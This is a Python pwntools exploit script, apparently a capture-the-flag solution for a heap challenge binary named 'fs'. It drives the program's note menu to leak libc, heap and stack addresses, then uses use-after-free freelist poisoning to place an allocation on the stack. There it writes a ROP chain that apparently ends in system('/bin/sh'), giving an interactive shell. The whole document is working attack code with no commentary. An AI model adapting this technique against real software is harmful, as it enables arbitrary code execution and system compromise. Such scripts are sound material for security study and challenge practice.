#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './fs')
libc = ELF(exe.libc.path)

def create(idx, name=b"A"*4, content=b"A"*4):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendlineafter(b": ", name)
    io.sendlineafter(b": ", content)

def edit(idx, content=b"A"*4):
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendlineafter(b": ", content)

def delete(idx):
    io.sendlineafter(b">> ", b"4")
    io.sendlineafter(b": ", str(idx).encode())

def view(idx):
    io.sendlineafter(b">> ", b"3")
    io.sendlineafter(b": ", str(idx).encode())
    return u64(io.recvline()[0:8])

io = process(exe.path)

for i in range(5): create(i)
for i in range(4): delete(i)

io.sendlineafter(b">> ", b"0"*0x800)
libc.address = view(0) - 0x3b5d70

for i in range(4): create(0)

delete(3)
delete(4)
heap_base = view(4) - 0x150

edit(4, p64(libc.address + 0x6290f5))

create(0)
create(0)

io.sendlineafter(b">> ", b"3")
io.sendlineafter(b": ",  b"0")

stack_leak = u64(io.recvuntil(b"1-")[51:59])

for i in range(5): create(i)

delete(0)
delete(1)

edit(1, p64(stack_leak-403))

create(0)
create(0)

edit(0, b"A"*19 + p64(libc.address + 0x21852) + p64(libc.address + 0x17d22e) + p64(libc.sym.system))
io.interactive()
